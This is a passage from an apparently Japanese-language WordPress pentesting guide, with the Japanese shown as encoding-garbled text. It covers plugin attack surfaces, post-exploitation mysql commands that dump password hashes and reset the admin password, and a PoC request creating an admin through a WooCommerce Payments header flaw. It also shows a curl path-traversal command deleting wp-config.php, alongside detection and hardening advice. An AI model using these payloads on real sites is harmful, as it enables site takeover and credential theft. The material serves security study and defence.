- Metasploit framework ã¯ã“ã®è„†å¼±æ€§ç”¨ã® exploit ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚é©åˆ‡ãªãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¦ç‰¹å®šã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€meterpreter ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç¢ºç«‹ã—ã€ã‚µã‚¤ãƒˆã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
- ã“ã‚Œã¯ WordPress ã‚µã‚¤ãƒˆã‚’æ‚ªç”¨ã™ã‚‹å¤šãã®æ–¹æ³•ã®ã†ã¡ã®ä¸€ã¤ã«éããªã„ç‚¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

å†…å®¹ã«ã¯ã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ãŠã‚ˆã³æœ‰åŠ¹åŒ–ã®æ‰‹é †ã‚’ç¤ºã™è¦–è¦šè³‡æ–™ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ãŸã ã—ã€ã“ã®ã‚ˆã†ãªæ–¹æ³•ã§è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯ã€é©åˆ‡ãªè¨±å¯ãŒãªã„é™ã‚Šé•æ³•ã‹ã¤éå€«ç†çš„ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã®æƒ…å ±ã¯è²¬ä»»ã‚’æŒã£ã¦ã€æ˜ç¢ºãªè¨±å¯ã®ã‚ã‚‹ penetration testing ãªã©ã®åˆæ³•çš„ãªæ–‡è„ˆã§ã®ã¿ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ã¯ WordPress ã® **Cross-Site Scripting (XSS)** è„†å¼±æ€§ã‚’ **Remote Code Execution (RCE)** ã‚„ãã®ä»–ã®é‡å¤§ãªè„†å¼±æ€§ã«ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚è©³ç´°ã¯ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚**Wordpress Versions 6.X.X, 5.X.X and 4.X.X. ã«å¯¾å¿œã—ã€ä»¥ä¸‹ã‚’å¯èƒ½ã«ã—ã¾ã™ï¼š**
- _**Privilege Escalation:**_ WordPress ã«ãƒ¦ãƒ¼ã‚¶ã‚’ä½œæˆã—ã¾ã™ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ï¼ˆbackdoorï¼‰ã‚’ WordPress ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
- _**(RCE) Built-In Plugin Edit:**_ WordPress ã®çµ„ã¿è¾¼ã¿ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(RCE) Built-In Theme Edit:**_ WordPress ã®çµ„ã¿è¾¼ã¿ãƒ†ãƒ¼ãƒã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(Custom) Custom Exploits:**_ ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£è£½ WordPress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³/ãƒ†ãƒ¼ãƒå‘ã‘ã®ã‚«ã‚¹ã‚¿ãƒ  exploitã€‚

## Post Exploitation

ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
adminã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Wordpressãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹ã‹ã‚’çŸ¥ã‚‹ã“ã¨ã¯ã€ãã®æ©Ÿèƒ½ã«å¯¾ã™ã‚‹è„†å¼±æ€§ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚ä»¥ä¸‹ã®ç®‡æ¡æ›¸ãã¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹ã‹ã‚’ç¤ºã—ã¦ãŠã‚Šã€è„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ä¾‹ã¯ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

- **`wp_ajax`**

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹æ–¹æ³•ã®ä¸€ã¤ã¯ AJAX ãƒãƒ³ãƒ‰ãƒ©çµŒç”±ã§ã™ã€‚ã“ã‚Œã‚‰ã«ã¯ãƒ­ã‚¸ãƒƒã‚¯ã€authorizationã€authentication ã®ãƒã‚°ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€ã“ã‚Œã‚‰ã®é–¢æ•°ã¯èªè¨¼ãŠã‚ˆã³ authorization ã®ä¸¡æ–¹ã‚’ wordpress nonce ã®å­˜åœ¨ã«åŸºã¥ãã“ã¨ãŒå¤šãã€**any user authenticated in the Wordpress instance might have**ï¼ˆå½¹å‰²ã«é–¢ä¿‚ãªãï¼‰ã€‚

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ï¼ˆæœªèªè¨¼ã®ãƒ¦ãƒ¼ã‚¶ã‚‚å«ã‚€ï¼‰ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚**

> [!CAUTION]
> ã•ã‚‰ã«ã€é–¢æ•°ãŒ `wp_verify_nonce` é–¢æ•°ã§ãƒ¦ãƒ¼ã‚¶ã®èªå¯ã®ã¿ã‚’ç¢ºèªã—ã¦ã„ã‚‹ã ã‘ã®å ´åˆã€ãã®é–¢æ•°ã¯å˜ã«ãƒ¦ãƒ¼ã‚¶ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ã„ã‚‹ã ã‘ã§ã€é€šå¸¸ã¯ãƒ¦ãƒ¼ã‚¶ã®å½¹å‰²ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æ¨©é™ã®ä½ã„ãƒ¦ãƒ¼ã‚¶ãŒé«˜æ¨©é™ã®æ“ä½œã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

- **REST API**

It's also possible to expose functions from wordpress registering a rest AP using the `register_rest_route` function:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ã¯ã€æŒ‡å®šã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãŒ API ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™æ¨©é™ãŒã‚ã‚‹ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯é–¢æ•°ã§ã™ã€‚

**çµ„ã¿è¾¼ã¿ã® `__return_true` é–¢æ•°ãŒä½¿ã‚ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶æ¨©é™ã®ãƒã‚§ãƒƒã‚¯ã‚’å˜ç´”ã«ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚**

- **php ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹**

ã‚‚ã¡ã‚ã‚“ã€Wordpress ã¯ PHP ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã‚¦ã‚§ãƒ–ã‹ã‚‰ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹è„†å¼±ãªæ©Ÿèƒ½ã‚’å…¬é–‹ã—ã¦ã„ã‚‹å ´åˆã€ãã®æ©Ÿèƒ½ã¯ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œå¾—ã¾ã™ã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯å†…éƒ¨çµ±åˆã‚„ãƒªãƒãƒ¼ã‚¹ãƒ—ãƒ­ã‚­ã‚·å‘ã‘ã« â€œtrusted headerâ€ ã®ã‚·ãƒ§ãƒ¼ãƒˆã‚«ãƒƒãƒˆã‚’å®Ÿè£…ã—ã€ãã®ãƒ˜ãƒƒãƒ€ã‚’ REST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã—ã¾ã™ã€‚ãƒ˜ãƒƒãƒ€ãŒä¸Šæµã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã‚ˆã£ã¦æš—å·å­¦çš„ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ç´ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯ãã‚Œã‚’å½è£…ã—ã¦ç®¡ç†è€…ã¨ã—ã¦æ¨©é™ã®ã‚ã‚‹ REST ãƒ«ãƒ¼ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

- Impact: æœªèªè¨¼ã®ã¾ã¾ admin ã«æ¨©é™æ˜‡æ ¼ â€” core users REST route ã‚’ä»‹ã—ã¦æ–°ã—ã„ administrator ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§é”æˆã•ã‚Œã‚‹ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (ãƒ¦ãƒ¼ã‚¶ ID 1 ã‚’å¼·åˆ¶ã€é€šå¸¸ã¯æœ€åˆã® administrator ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ)
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ãªãœå‹•ä½œã™ã‚‹ã‹

- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’èªè¨¼çŠ¶æ…‹ã«ãƒãƒƒãƒ—ã—ã€æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’ã‚¹ã‚­ãƒƒãƒ—ã™ã‚‹ã€‚
- WordPress core ã¯ã“ã®ãƒ«ãƒ¼ãƒˆã« `create_users` æ¨©é™ã‚’æœŸå¾…ã™ã‚‹ãŒã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ãƒãƒƒã‚¯ã¯ãƒ˜ãƒƒãƒ€ãƒ¼ã‹ã‚‰ç›´æ¥ current user ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã€‚

æœŸå¾…ã•ã‚Œã‚‹æˆåŠŸæŒ‡æ¨™

- HTTP 201 ã¨ä½œæˆã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¨˜è¿°ã™ã‚‹ JSON ãƒœãƒ‡ã‚£ã€‚
- `wp-admin/users.php` ã«æ–°ã—ã„ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã€‚

æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

- `getallheaders()`, `$_SERVER['HTTP_...']`ã€ã¾ãŸã¯ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’èª­ã¿å–ã£ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãƒ™ãƒ³ãƒ€ãƒ¼SDKï¼ˆä¾‹: `wp_set_current_user()`, `wp_set_auth_cookie()`ï¼‰ã‚’grepã™ã‚‹ã€‚
- ç‰¹æ¨©ä»˜ãã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ãŒå …ç‰¢ãª `permission_callback` ãƒã‚§ãƒƒã‚¯ã‚’æ¬ ãã€ä»£ã‚ã‚Šã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼ã«ä¾å­˜ã—ã¦ã„ãªã„ã‹ REST ç™»éŒ²ã‚’ç¢ºèªã™ã‚‹ã€‚
- REST ãƒãƒ³ãƒ‰ãƒ©å†…ã§ãƒ˜ãƒƒãƒ€ãƒ¼å€¤ã®ã¿ã§ã‚²ãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ã‚³ã‚¢ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ç®¡ç†é–¢æ•°ï¼ˆ`wp_insert_user`, `wp_create_user`ï¼‰ã®ä½¿ç”¨ã‚’æ¢ã™ã€‚

ãƒãƒ¼ãƒ‰ãƒ‹ãƒ³ã‚°

- èªè¨¼ã‚„èªå¯ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‹ã‚‰æ´¾ç”Ÿã•ã›ãªã„ã€‚
- reverse proxy ãŒè­˜åˆ¥æƒ…å ±ã‚’æ³¨å…¥ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã¯ã€ãƒ—ãƒ­ã‚­ã‚·ã§ä¿¡é ¼ã‚’çµ‚äº†ã—ã‚¤ãƒ³ãƒã‚¦ãƒ³ãƒ‰ã®ã‚³ãƒ”ãƒ¼ã‚’å‰Šé™¤ã™ã‚‹ï¼ˆä¾‹: ã‚¨ãƒƒã‚¸ã§ `unset X-Wcpay-Platform-Checkout-User`ï¼‰ã€ãã®å¾Œç½²åä»˜ããƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¸¡ã—ã¦ã‚µãƒ¼ãƒãƒ¼å´ã§æ¤œè¨¼ã™ã‚‹ã€‚
- ç‰¹æ¨©æ“ä½œã‚’è¡Œã† REST ãƒ«ãƒ¼ãƒˆã§ã¯ `current_user_can()` ãƒã‚§ãƒƒã‚¯ã¨å³æ ¼ãª `permission_callback` ã‚’è¦æ±‚ã™ã‚‹ï¼ˆ`__return_true` ã‚’ä½¿ã‚ãªã„ï¼‰ã€‚
- ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã‚ˆã‚‹â€œimpersonationâ€ã‚ˆã‚Šã‚‚ãƒ•ã‚¡ãƒ¼ã‚¹ãƒˆãƒ‘ãƒ¼ãƒ†ã‚£ã®èªè¨¼ï¼ˆcookiesã€application passwordsã€OAuthï¼‰ã‚’å„ªå…ˆã™ã‚‹ã€‚

å‚è€ƒ: ã“ã®ãƒšãƒ¼ã‚¸æœ«ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚å…¬é–‹äº‹ä¾‹ã¨ã‚ˆã‚Šåºƒã„åˆ†æãŒã‚ã‚Šã¾ã™ã€‚

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress ã®ãƒ†ãƒ¼ãƒã‚„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ `wp_ajax_` ã¨ `wp_ajax_nopriv_` ãƒ•ãƒƒã‚¯ã‚’é€šã˜ã¦ AJAX ãƒãƒ³ãƒ‰ãƒ©ã‚’å…¬é–‹ã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚**_nopriv_** ãƒãƒªã‚¢ãƒ³ãƒˆãŒä½¿ã‚ã‚Œã‚‹ã¨ã€**ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ãŒèªè¨¼ã•ã‚Œã¦ã„ãªã„è¨ªå•è€…ã‹ã‚‰åˆ°é”å¯èƒ½ã«ãªã‚‹**ãŸã‚ã€æ•æ„Ÿãªæ“ä½œã«ã¯è¿½åŠ ã§æ¬¡ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚‹:

1. æ¨©é™ãƒã‚§ãƒƒã‚¯ï¼ˆä¾‹: `current_user_can()` ã¾ãŸã¯æœ€ä½ã§ã‚‚ `is_user_logged_in()`ï¼‰ã€ãŠã‚ˆã³
2. `check_ajax_referer()` / `wp_verify_nonce()` ã«ã‚ˆã‚‹ CSRF nonce ã®æ¤œè¨¼ã€ãŠã‚ˆã³
3. å³æ ¼ãªå…¥åŠ›ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚ºï¼æ¤œè¨¼ã€‚

Litho ãƒãƒ«ãƒãƒ‘ãƒ¼ãƒ‘ã‚¹ãƒ†ãƒ¼ãƒ (< 3.1) ã¯ *Remove Font Family* æ©Ÿèƒ½ã§ã“ã‚Œã‚‰ 3 ã¤ã®åˆ¶å¾¡ã‚’å¿˜ã‚Œã€çµæœã¨ã—ã¦æ¬¡ã®ã‚³ãƒ¼ãƒ‰ï¼ˆç°¡ç•¥åŒ–ï¼‰ã‚’å‡ºè·ã—ãŸ:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
* **æœªèªè¨¼ã‚¢ã‚¯ã‚»ã‚¹** â€“ `wp_ajax_nopriv_` ãƒ•ãƒƒã‚¯ãŒç™»éŒ²ã•ã‚Œã¦ã„ã¾ã™ã€‚
* **No nonce / capability check** â€“ ä»»æ„ã®è¨ªå•è€…ãŒã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
* **No path sanitisation** â€“ ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¶å¾¡ã® `fontfamily` æ–‡å­—åˆ—ãŒãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ãªã—ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‘ã‚¹ã«é€£çµã•ã‚Œã¦ãŠã‚Šã€å¤å…¸çš„ãª `../../` ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’è¨±ã—ã¾ã™ã€‚

#### æ‚ªç”¨

æ”»æ’ƒè€…ã¯å˜ä¸€ã® HTTP POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã“ã¨ã§ã€**uploads ãƒ™ãƒ¼ã‚¹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªä»¥ä¸‹**ï¼ˆé€šå¸¸ `<wp-root>/wp-content/uploads/`ï¼‰ã®ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¾ãŸã¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å‰Šé™¤ã§ãã¾ã™ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

* ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ˜ãƒ«ãƒ‘ãƒ¼ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()` ãªã©ï¼‰ã‚’å‘¼ã³å‡ºã™ `add_action( 'wp_ajax_nopriv_...')` ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã€‚
* ãƒ‘ã‚¹ã«æœªã‚µãƒ‹ã‚¿ã‚¤ã‚ºã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’é€£çµã—ã¦ã„ã‚‹ç®‡æ‰€ï¼ˆ`$_POST`, `$_GET`, `$_REQUEST` ã‚’æ¢ã™ï¼‰ã€‚
* `check_ajax_referer()` ã‚„ `current_user_can()`/`is_user_logged_in()` ã®æ¬ å¦‚ã€‚

#### ãƒãƒ¼ãƒ‰ãƒ‹ãƒ³ã‚°
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Always** ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã®æ›¸ãè¾¼ã¿/å‰Šé™¤æ“ä½œã‚’ privileged ã¨è¦‹ãªã—ã€æ¬¡ã‚’äºŒé‡ã«ç¢ºèªã—ã¦ãã ã•ã„:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

å¤šãã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€å…ƒã®ãƒ­ãƒ¼ãƒ«ã‚’ user meta ã«ä¿å­˜ã—ã¦å¾Œã§å¾©å…ƒã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã€Œview as roleã€ã‚„ä¸€æ™‚çš„ãªãƒ­ãƒ¼ãƒ«åˆ‡æ›¿æ©Ÿèƒ½ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚å¾©å…ƒå‡¦ç†ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆä¾‹: `$_REQUEST['reset-for']`ï¼‰ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ç®¡ç†ã®ãƒªã‚¹ãƒˆã®ã¿ã«ä¾å­˜ã—ã€capabilities ã®ç¢ºèªã‚„æœ‰åŠ¹ãª nonce ã‚’ãƒã‚§ãƒƒã‚¯ã—ãªã„å ´åˆã€ã“ã‚Œã¯å‚ç›´çš„ãª privilege escalation ã«ãªã‚Šã¾ã™ã€‚

å®Ÿä¾‹ã¯ Admin and Site Enhancements (ASE) ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ (â‰¤ 7.6.2.1) ã«è¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚reset ãƒ–ãƒ©ãƒ³ãƒã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒå†…éƒ¨é…åˆ— `$options['viewing_admin_as_role_are']` ã«å­˜åœ¨ã™ã‚‹å ´åˆã« `reset-for=<username>` ã«åŸºã¥ã„ã¦ãƒ­ãƒ¼ãƒ«ã‚’å¾©å…ƒã—ã¾ã—ãŸãŒã€ç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã¦ user meta `_asenha_view_admin_as_original_roles` ã‹ã‚‰ä¿å­˜ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã‚’å†è¿½åŠ ã™ã‚‹å‰ã«ã€`current_user_can()` ãƒã‚§ãƒƒã‚¯ã‚‚ nonce æ¤œè¨¼ã‚‚è¡Œã£ã¦ã„ã¾ã›ã‚“ã§ã—ãŸ:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- `$_REQUEST['reset-for']` ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚µãƒ¼ãƒãƒ¼å´ã®èªå¯ãªã—ã«ä¿¡é ¼ã—ã¦ã„ã‚‹ã€‚
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä»¥å‰ `_asenha_view_admin_as_original_roles` ã«ã‚ˆã‚Šé«˜ã„æ¨©é™ã‚’ä¿å­˜ã•ã‚Œã¦ã„ã¦é™æ ¼ã•ã‚Œã¦ã„ãŸå ´åˆã€ãƒªã‚»ãƒƒãƒˆãƒ‘ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ãã‚Œã‚‰ã‚’å¾©å…ƒã§ãã‚‹ã€‚
- ä¸€éƒ¨ã®ãƒ‡ãƒ—ãƒ­ã‚¤ã§ã¯ã€èªè¨¼æ¸ˆã¿ã®ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ `viewing_admin_as_role_are` ã«ã¾ã æ®‹ã£ã¦ã„ã‚‹åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®ãƒªã‚»ãƒƒãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ãã‚‹ï¼ˆèªå¯ã®ä¸å‚™ï¼‰ã€‚

æ”»æ’ƒã®å‰ææ¡ä»¶

